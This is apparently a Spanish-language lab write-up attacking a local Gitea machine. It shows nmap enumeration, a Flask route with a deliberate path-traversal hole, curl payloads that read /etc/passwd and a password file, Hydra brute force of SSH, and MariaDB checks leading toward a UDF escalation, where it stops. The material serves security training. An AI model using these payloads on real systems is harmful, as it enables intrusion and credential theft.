## FASE DE ENUMERACIÓN

Lanzamos un scaner con nmap para ver que puertos tiene abiertos la máquina victima y los servicios que cooren por ellos:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios  
```
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e5:9a:b5:5e:a7:fc:3b:2f:7e:62:dd:51:61:f5:aa:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJlX8HUpWECJWj9EBrcZdu7DR/IKU6sQIn2Rx8jrDxZGYYrXV7Su2UZ/wR8Y0Do26H/h0wW9p3hm6mGn5F5ZUOw=
|   256 8e:ff:03:d7:9b:72:10:c9:72:03:4d:b8:bb:77:e9:b2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHGFlZunFEFvg/diGF3I2AwlkL8QHCxO4Wjzp2KMNDJm
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Gitea: Git with a cup of tea
| http-methods: 
|_  Supported Methods: HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 8C971BC353008D67BA53965E12AE5A43
3000/tcp open  http    syn-ack ttl 64 Golang net/http server
|_http-title: Gitea: Git with a cup of tea
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
| http-methods: 
|_  Supported Methods: HEAD GET
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=d20d49b100a58736; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=uVFlDSwgUs5nVrqUzk7_t7o3mZE6MTc0MTE5MTcyMDYwMTA4ODM0NQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 05 Mar 2025 16:22:00 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0cy9pbWcvbG9nby5wbm

```
Tenemos un puerto 22 con SSH en versión no vulnerable, sin user ni pass lo dejamos de momento
Tenemos 2 servicos http, uno corre por el puerto 80 y otro por el 3000

abrimos en el navegador http://172.17.0.2 y buscamos algo en su código fuente y no encontramos nada.
abrimos en el navegado el http://172.17.0.2:3000 y buscamos en el código fuente, y encontramos esto:
```
</noscript>
	
	<meta property="og:title" content="Gitea: Git with a cup of tea">
	<meta property="og:type" content="website">
	<meta property="og:image" content="/assets/img/logo.png">
	<meta property="og:url" content="http://admin.s3cr3tdir.dev.gitea.dl/">
	<meta property="og:description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
```

vemos que se utiliza virtual hosting y nos da una direccion http://admin.s3cr3tdir.dev.gitea.dl/, abrimos el /etc/hosts y añadimos 
el subdominio y aprovechamos y metemos retroactivamente el resto quedando así:

```bash
172.17.0.2      admin.s3cr3tdir.dev.gitea.dl gitea.dl dev.gitea.dl s3cr3tdir.dev.gitea.dl
```
en el navegador nos vamos al subdominio mencionado y vemos una plantilla gitea, si añadimos en el buscado "/explore/users" podremos listar los usuarios:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/explore/users
```
vemos dos users que apuntamos como posibles usuarios para el SSH:
-designer
-admin

El repositorio de admin está vacio, así que nos centramos en el del usuario designer, vamos a:
```
http://admin.s3cr3tdir.dev.gitea.dl/designer
```
vermos tres repositorios y nos centramos en el de "myapp"
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp/
```
vemos una app y antes de analizar vamos a mirar los commint:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp/commits/branch/main
```
y vemos dos historicos, en este concretamente:
```bash
http://admin.s3cr3tdir.dev.gitea.dl/designer/myapp/commit/14a31ecee9376588ead735a51d9934db7983f2d3
```
vemos esto:
```
@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get("filename")  # Se obtiene de la URL
    filename = request.args.get("filename")

    if not filename:
        flash("Se requiere un nombre de archivo", "danger")
        return redirect(url_for("index"))

    # **Vulnerabilidad**: No se valida el path, permitiendo Path Traversal
    file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

    if os.path.exists(file_path):

```
parece ser que es vulnerable a path traversal, vamos a analizar un poco el código de la app:
```
from flask import Flask, request, render_template, send_file, redirect, url_for, flash
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

UPLOAD_FOLDER = "uploads"
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        if "file" not in request.files:
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file = request.files["file"]

        if file.filename == "":
            flash("No se ha seleccionado ningún archivo", "danger")
            return redirect(request.url)

        file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
        file.save(file_path)
        flash(f'Archivo "{file.filename}" subido correctamente.', "success")

    files = os.listdir(UPLOAD_FOLDER)
    return render_template("index.html", files=files)


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get("filename")

    if not filename:
        flash("Se requiere un nombre de archivo", "danger")
        return redirect(url_for("index"))

    file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)

    flash("Archivo no encontrado", "danger")
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(debug=True)
```
podemos ver una ruta llamada "/download" y un argumento "file" que probablemente nos ayude al pathtraversal, vamos a probarlo:
* Nota: probé con los subdominios hasta que me respondió gitea.dl
ponemos en el buscador:
```bash
http://gitea.dl/download?filename=../../../../../etc/passwd
```
y nos descarga un archivo dónde efectivamente está el /etc/passwd, pruebo con curl ya que no quiero mil archivos en mi máquina:
```bash
curl "http://gitea.dl/download?filename=../../../../../etc/passwd"
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
designer:x:1001:1001::/home/designer:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:103:MariaDB Server,,,:/nonexistent:/bin/false
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
```
Después de trastear y no encontrar nada relevante me acuerdo de que había más proyectos e indago nuevamente en ellos,
uno que nos "puede" dar unas credenciales de mysql:
```
 <MYSQL_ROOT_PASSWORD>root123</MYSQL_ROOT_PASSWORD>
        <MYSQL_DATABASE>gitea</MYSQL_DATABASE>
        <MYSQL_USER>designer</MYSQL_USER>
        <MYSQL_PASSWORD>designer123</MYSQL_PASSWORD>
```
y otro que nos da unas rutas de gitea:
```
<volume>/home/designer/gitea:/data</volume>
            <volume>/home/designer/gitea:/data/info.txt</volume>
            <volume>/opt/"INFO_FILE"</volume>
        </volumes>
        <environment>
            <variable name="GITEA__database__DB_TYPE">sqlite3</variable>
            <variable name="GITEA__database__PATH">/data/gitea.db</variable>
```

En esta parte concretamente vemos dos rutas "/home/designer/gitea:/data/info.txt" y "/opt/"INFO_FILE""
probamos con
```bash
http://gitea.dl/download?filename=../../../../../../../../../../home/designer/gitea/data/info.txt
```
y no obtenemos nada, pruebo en /opt y me imagino que info file sea info.txt como para el /home:
```bash
 curl "http://gitea.dl/download?filename=../../../../../opt/info.txt"
```
```
user001:Passw0rd!23 - Juan abrió su laptop y suspiró. Hoy era el día en que finalmente accedería a la base de datos.
user002:Qwerty@567 - Marta había elegido su contraseña basándose en su teclado, una decisión que lamentaría más tarde.
user003:Secure#Pass1 - Cuando Miguel configuró su clave, pensó que era invulnerable. No sabía lo que le esperaba.
user004:H4ckM3Plz! - Los foros de hackers estaban llenos de desafíos, y Pedro decidió probar con una cuenta de prueba.
user005:Random*Key9 - Sofía tenía la costumbre de escribir sus contraseñas en post-its, hasta que un día desaparecieron.
user006:UltraSafe99$ - "Esta vez seré más cuidadoso", se prometió Andrés mientras ingresaba su nueva clave.
user007:TopSecret!! - Lucía nunca compartía su contraseña, ni siquiera con sus amigos más cercanos.
user008:MyP@ssw0rd22 - Julián pensó que usar números en lugar de letras lo haría más seguro. Se equivocó.
user009:S3cur3MePls# - La empresa exigía contraseñas seguras, pero Carlos siempre encontraba una forma de simplificarlas.
user010:Admin123! - Un ataque de fuerza bruta reveló que la cuenta del administrador tenía una clave predecible.
user011:RootMePls$5 - Daniel dejó su servidor expuesto y no tardó en notar actividad sospechosa.
user012:SuperSecure*78 - Alejandra se enorgullecía de su conocimiento en seguridad, pero un descuido le costó caro.
user013:HelloWorld#91 - A Roberto le gustaba la programación y decidió usar un clásico como su clave.
user014:LetMeInNow!! - Diego estaba cansado de recordar claves complejas y optó por algo simple.
user015:TrickyPass66 - Una red social filtró su contraseña y pronto la vio expuesta en la web.
user016:UnsafeButFun$$ - Joaquín se divertía rompiendo su propia seguridad, pero un día fue víctima de su propio juego.
user017:HackThis!@3 - Beatriz creó su contraseña en modo irónico, pero los atacantes no lo tomaron como broma.
user018:SuperSecurePassword123 - Los hackers más novatos pensaban que usar lenguaje leet era seguro. No lo era.
user019:JustAnotherKey99 - Nadie pensaría en usar una clave tan genérica... excepto miles de personas.
user020:TryGuessMe#22 - Un pentester descubrió la clave en segundos y le envió un mensaje a su dueño.
user021:SimplePass88! - Isabel nunca imaginó que alguien intentaría adivinar su contraseña.
user022:HiddenSecret!2 - Aún después de cambiar su clave, Luis no podía quitarse la sensación de inseguridad.
user023:CrazyCodePass@ - Un desarrollador decidió probar una contraseña al azar... y olvidarla al día siguiente.
user024:SneakyKey99$ - Los ataques de diccionario estaban de moda, y Pablo decidió cambiar su clave.
user025:Password@Vault - Un gestor de contraseñas podría haber ayudado a Ricardo, pero prefirió confiar en su memoria.
user026:EliteHacker#77 - Creer que una contraseña es segura solo por tener símbolos es un error común.
user027:FortKnoxPass!! - Ignacio aprendió por las malas que no existe una seguridad infalible.
user028:IronWall!99 - La clave era sólida, pero un descuido con su correo llevó a una filtración.
user029:UltraHidden#32 - A pesar del nombre, la contraseña de Javier no era tan oculta.
user030:GodModeActive! - Mariana sintió que tenía el control, hasta que recibió una alerta de acceso sospechoso.
user031:MasterKey$66 - Un viejo truco de seguridad le falló a Fernando en el peor momento.
user032:NoOneCanSeeMe! - La privacidad era esencial para Esteban, pero alguien siempre estaba mirando.
user033:LockedSafe#12 - Una contraseña compleja no sirve si la guardas en un documento sin cifrar.
user034:MyLittleSecret@ - El diario de Valeria contenía muchos secretos, incluida su clave más preciada.
user035:BigBossKey!! - Alfonso era el administrador del sistema, pero un error le costó el acceso.
user036:DigitalFortress$ - Inspirado en su novela favorita, Tomás creó una clave única... o eso creía.
user037:PasswordBank#9 - Usar la misma clave para todo fue la peor decisión de Gabriel.
user038:YouShallNotPass! - El homenaje a Gandalf no protegió a Enrique de un ataque automatizado.
user039:NotSoObvious99 - Era una contraseña "no tan obvia", hasta que apareció en una filtración.
user040:SecretStash@12 - Emilia guardaba sus contraseñas en un archivo llamado "Seguridad.txt". Mala idea.
user041:AnonymousPass$ - Creyó que su clave era anónima, pero los registros contaban otra historia.
user042:BlackHatKey!77 - Aprender hacking ético le ayudó a darse cuenta de sus propias vulnerabilidades.
user043:RedTeamAccess# - Un pentest interno reveló que la seguridad de la empresa era más frágil de lo que pensaban.
user044:PrivilegedUser@ - Tener privilegios de administrador no te hace inmune a ataques.
user045:HiddenVault$$ - Un sistema de almacenamiento cifrado no sirve si la clave es demasiado simple.
user046:EncryptionKing! - Amante del cifrado, Samuel pensó que su clave era invulnerable. No lo era.
user047:DecryptedEasy# - Un día descubrió que su clave había sido descifrada con facilidad.
user048:BypassMePlz!! - Quiso jugar con la seguridad y terminó perdiendo el acceso.
user049:SuperHiddenKey@ - Creyó que su contraseña nunca sería descubierta... hasta que lo fue.
user050:CyberGuardian99! - La ciberseguridad no es solo cuestión de contraseñas fuertes, sino de hábitos seguros.
```

Bueno ya tenemos un montón de contraseñas y con el cat al /etc/home unos usuarios, es el momento de lanzar fuerza bruta al ssh.
Nos creamos un diccionario con los password que obtuvimos antes quedando así:
```bash
Passw0rd!23
Qwerty@567
Secure#Pass1
H4ckM3Plz!
Random*Key9
UltraSafe99$
TopSecret!!
MyP@ssw0rd22
S3cur3MePls#
Admin123!
RootMePls$5
SuperSecure*78
HelloWorld#91
LetMeInNow!!
TrickyPass66
UnsafeButFun$$
HackThis!@3
SuperSecurePassword123
JustAnotherKey99
TryGuessMe#22
SimplePass88!
HiddenSecret!2
CrazyCodePass@
SneakyKey99$
Password@Vault
EliteHacker#77
FortKnoxPass!!
IronWall!99
UltraHidden#32
GodModeActive!
MasterKey$66
NoOneCanSeeMe!
LockedSafe#12
MyLittleSecret@
BigBossKey!!
DigitalFortress$
PasswordBank#9
YouShallNotPass!
NotSoObvious99
SecretStash@12
AnonymousPass$
BlackHatKey!77
RedTeamAccess#
PrivilegedUser@
HiddenVault$$
EncryptionKing!
DecryptedEasy#
BypassMePlz!!
SuperHiddenKey@
CyberGuardian99!
```
Antes de meternos en la fase de intrusión buscamos cosas en los subdominios, haciendo fuzzing y mirando el código fuente y entre las
cosas interesantes en el subdominio " gitea.dl" encontramos un login con unas credenciales que nos guardamos:
```bash
User: admin
Pass: PassAdmin123-
```
## FASE DE INTRUSIÓN

Es el momento de ralizar fuerza bruta con hydra:
```bash
hydra -P diccionario.txt  -l designer  -t 16 -V -f -I ssh://172.17.0.2
```
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-13 14:44:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Passw0rd!23" - 1 of 50 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Qwerty@567" - 2 of 50 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Secure#Pass1" - 3 of 50 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "H4ckM3Plz!" - 4 of 50 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Random*Key9" - 5 of 50 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "UltraSafe99$" - 6 of 50 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "TopSecret!!" - 7 of 50 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "MyP@ssw0rd22" - 8 of 50 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "S3cur3MePls#" - 9 of 50 [child 8] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "Admin123!" - 10 of 50 [child 9] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "RootMePls$5" - 11 of 50 [child 10] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "SuperSecure*78" - 12 of 50 [child 11] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "HelloWorld#91" - 13 of 50 [child 12] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "LetMeInNow!!" - 14 of 50 [child 13] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "TrickyPass66" - 15 of 50 [child 14] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "UnsafeButFun$$" - 16 of 50 [child 15] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "HackThis!@3" - 17 of 50 [child 14] (0/0)
[ATTEMPT] target 172.17.0.2 - login "designer" - pass "SuperSecurePassword123" - 18 of 50 [child 12] (0/0)
[22][ssh] host: 172.17.0.2   login: designer   password: SuperSecurePassword123
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-13 14:44:09
```
ya tenemos el user y el pass designer:SuperSecurePassword123

Nos conectamos por SSH:
```bash
ssh designer@172.17.0.2
```

Ya estamos dentro


## FASE ESCALADA DE PRIVILEGIOS

Una ver dentro siendo el usuario designer, vamos a comprobar si estamos en algún grupo privilegiado:
** privilegio en grupos:
```bash
id
```
```
uid=1001(designer) gid=1001(designer) groups=1001(designer)
```
no estamos en ningún grupo con privilegios

** Privilegio sudo:
```bash
sudo -l
```
```
sudo] password for designer: 
Sorry, user designer may not run sudo on 981e9f52b4d9.
```
nos pide contraseña e introducimos el pass:SuperSecurePassword123
no tenemos ningún privilegio sudo

** Buscamos SUID:

```bash
find / -perm -4000 2>/dev/null
```
```
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
no hay ningún binario que podamos abusar
En este momento nos acordamos de que teníamos user y pass para mysql, vamos a comprobar si internamente el puerto
3306 está abierto, que es por el que corre mysql:

```bash
ss -tuln
```
```
Netid                   State                    Recv-Q                   Send-Q                                      Local Address:Port                                       Peer Address:Port                   Process                   
tcp                     LISTEN                   0                        80                                              127.0.0.1:3306                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                               0.0.0.0:80                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                               0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                                    *:3000                                                  *:*                                                
tcp                     LISTEN                   0                        128                                                  [::]:22                                                 [::]:*
```

parece que está corriendo, vamos a intentar conectarnos a la base de datos, tnemos estos user u pass:
```
 <MYSQL_ROOT_PASSWORD>root123</MYSQL_ROOT_PASSWORD>
        <MYSQL_DATABASE>gitea</MYSQL_DATABASE>
        <MYSQL_USER>designer</MYSQL_USER>
        <MYSQL_PASSWORD>designer123</MYSQL_PASSWORD>
```
y los obtenidos del panel de login:

```bash
User: admin
Pass: PassAdmin123-
```

concretamente nos  funciona el del panel del login:
```bash
mysql -u admin -p
```
y cuando nos pide el login usamos:
```
PassAdmin123-
```

estamos dentro de la base de datos, y siendo admin vamos a comprobar los privilegios de los que disponemos:
```bash
SHOW GRANTS;
```
```
MariaDB [(none)]> SHOW GRANTS;
+------------------------------------------------------------------------------------------------------------------------------------------------+
| Grants for admin@localhost                                                                                                                     |
+------------------------------------------------------------------------------------------------------------------------------------------------+
| GRANT SELECT, INSERT, UPDATE, DELETE, EXECUTE ON *.* TO `admin`@`localhost` IDENTIFIED BY PASSWORD '*6B77115C352F8F98A4DD4D3401F18E19D88FC7FC' |
+------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```
Esto huele a una escalada con User-Defined Functions, vamos a comprobar si hay definido algún valor para la variable secure_file_priv que es una variable que 
limita el origen y destino de los datos, si está configurada en una ruta sin acceso aquí termina la cosa:
```bash
SHOW VARIABLES LIKE 'SECURE_FILE_PRIV';
```
```
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```
está vacía así pues podremos hacer una escalada por aquí, y por ultimo vamos a ver la ruta de los plugins:
```bash
SHOW VARIABLES LIKE 'PLUGIN_DIR';
```
```
---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+-------------------------
```

